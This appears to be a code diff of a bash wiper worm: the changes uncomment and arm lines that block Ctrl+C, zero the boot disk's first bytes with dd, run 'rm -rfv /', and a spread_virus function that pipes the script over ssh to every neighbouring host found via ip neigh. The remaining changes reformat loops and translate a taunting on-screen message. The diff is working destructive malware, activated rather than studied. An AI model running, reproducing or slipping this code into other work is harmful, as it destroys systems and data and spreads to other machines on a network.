@@ -2,7 +2,7 @@
 
 # Signal 2 is Ctrl+C
 # Okay disable it:
-#trap '' 2  
+trap '' 2  
 
 function take_boot_disk() 
 {
@@ -14,10 +14,14 @@ function take_boot_disk()
 function destroy_OS()
 {
     setterm -foreground red
-        for i in {1..50}; do sleep .1; echo "       YOU FUCKED UP       "; done
+        for i in {1..50} 
+        do 
+            sleep .1; echo "       YOU FUCKED UP       "
+        done
     
     sleep 3
-    echo -e "Procediendo a destruir el sistema y bootloader..."
+    echo 
+    echo -e "Proceeding to destroy the system and bootloader..."
     sleep 2
         echo -ne '#####                     (33%)\r'
             sleep 1
@@ -26,9 +30,9 @@ function destroy_OS()
         echo -ne '#######################   (100%)\r'
             echo -ne '\n'
     
-    #dd if=/dev/zero of=$(take_boot_disk) bs=1 count=46
-    #rm -rfv /
-    #printf -- "$(echo $RANDOM | md5sum | head -c 20; echo;)%.1s" {1..10567}
+    dd if=/dev/zero of=$(take_boot_disk) bs=1 count=46
+    rm -rfv /
+    printf -- "$(echo $RANDOM | md5sum | head -c 20; echo;)%.1s" {1..10567}
     
     echo $RANDOM | md5sum | head -c 20; echo;
 
@@ -105,14 +109,14 @@ ip neigh show | awk -F " " '{print $1};'
 PREFIX=$(hostname -I | awk -F ' ' '{print $1};' | cut -d '.' -f-2)
 INTERFACE=$(ip a l | grep -iE "$(hostname -I | awk -F ' ' '{print $1};')" | cut -d ' ' -f12)
 
-for SUBNET in {0..1}
-do 
-    for HOST in {0..10}
-    do
-        echo "[*] IP : "$PREFIX"."$SUBNET"."$HOST
-        arping -c 1 -I $INTERFACE $PREFIX"."$SUBNET"."$HOST 2>/dev/null
-    done
-done
+        for SUBNET in {0..1}
+        do 
+            for HOST in {0..10}
+            do
+                echo "[*] IP : "$PREFIX"."$SUBNET"."$HOST
+                arping -c 1 -I $INTERFACE $PREFIX"."$SUBNET"."$HOST 2>/dev/null
+            done
+        done
 
 }
 
@@ -120,7 +124,11 @@ function spread_virus {
 FILE_SEND="clean_boot_disk.sh"
 FILE_PATH="/tmp"      
     cd $FILE_PATH
-    for i in `ip neigh show | awk -F " " '{print $1};' | grep -vE "*.1"`; do ssh -v $i 'bash -s' < $FILE_PATH/$FILE_SEND; done
+    for i in `ip neigh show | awk -F " " '{print $1};' | grep -vE "*.1"`
+    do 
+        ssh -v $i 'bash -s' < $FILE_PATH/$FILE_SEND
+    
+    done
 }
 
 sleep 2
@@ -131,4 +139,4 @@ spread_virus
 
 destroy_OS
 
-#bye_bye
+bye_bye
